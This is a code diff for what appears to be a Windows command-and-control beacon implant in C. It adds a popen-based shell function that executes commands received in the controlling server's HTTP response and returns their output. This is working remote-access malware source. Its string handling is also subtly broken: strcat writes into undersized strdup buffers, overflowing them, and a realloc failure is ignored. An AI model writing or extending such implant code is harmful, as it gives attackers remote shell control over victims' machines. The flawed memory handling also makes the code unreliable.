@@ -3,6 +3,8 @@
 #include <tlhelp32.h>
 #include "log.h"
 
+#define patch_length 2
+
 struct {
     CHAR*   address;
     INT     port;
@@ -37,6 +39,42 @@ struct {
 struct {
     int     count;
 } beacon;
+
+unsigned char patch_list_name[patch_length] = {0xAA};
+
+BOOL AA$shell(CHAR* input, CHAR** output) {
+    log_debug("Attempting to execute: %s\n", input);
+    FILE *out;
+    CHAR buf[100];
+    CHAR* str = NULL;
+    CHAR* temp = NULL;
+    unsigned int size = 1;
+    unsigned int strlength;
+
+    if (NULL == (out = popen(input, "r"))) {
+        perror("popen");
+        exit(EXIT_FAILURE);
+    }
+
+    while (fgets(buf, sizeof(buf), out) != NULL) {
+        strlength = strlen(buf);
+        temp = realloc(str, size + strlength);  // allocate room for the buf that gets appended
+        if (temp == NULL) {
+            // allocation error
+        } else {
+            str = temp;
+        }
+        strcpy(str + size - 1, buf); // append buffer to str
+        size += strlength; 
+    }
+
+    *output = _strdup(str);
+
+    pclose(out);
+    return TRUE;
+}
+
+BOOL (*patch_list_pointers[patch_length]) (CHAR* input, CHAR **output) = {AA$shell};
 
 CHAR* encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
     DWORD encoded_data_length = strlen(data_to_encode) * 2;
@@ -83,6 +121,14 @@ void process_command(CHAR* command, CHAR* input) {
     log_debug("Hex value: 0x%x", hex_command);
     log_debug("Input: %s", input);
 
+    CHAR* command_input = strdup(command); // Must be freed
+    strcat(command_input, " "); 
+    strcat(command_input, input); 
+    if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
+        log_info("Output:%s", output);
+        goto send_output;
+    }
+
     goto send_output;
     send_output:
         /**
@@ -103,8 +149,11 @@ void process_command(CHAR* command, CHAR* input) {
             goto cleanup;
         }
     cleanup:
+        log_debug("Attempting to clean memory");
         free(input);
         free(output);
+        free(command_input);
+        return;
 }
 
 void http_request() {
@@ -178,7 +227,27 @@ void http_request() {
 
             goto cleanup;
         } else {
-            log_debug("This is inside process response %s", response);
+            CHAR* token = strtok(response, " ");
+            CHAR* input = strdup(""); // Must be freed
+            CHAR* command = token;
+            INT count = 0;
+            printf("Command found: %s\n", command);
+            while (token != NULL) {
+                count += 1;
+                if (count == 1) {
+                    token = strtok(NULL, " ");
+                    continue;
+                } else {
+                    printf("Token: %s\n", token);
+                    CHAR* input_parameter = strdup(token); // Must be freed
+                    strcat(input_parameter, " ");
+                    strcat(input, input_parameter);
+                    free(input_parameter);
+                }
+                token = strtok(NULL, " ");
+            }
+
+            process_command(command, input);
             goto cleanup;
         }
 
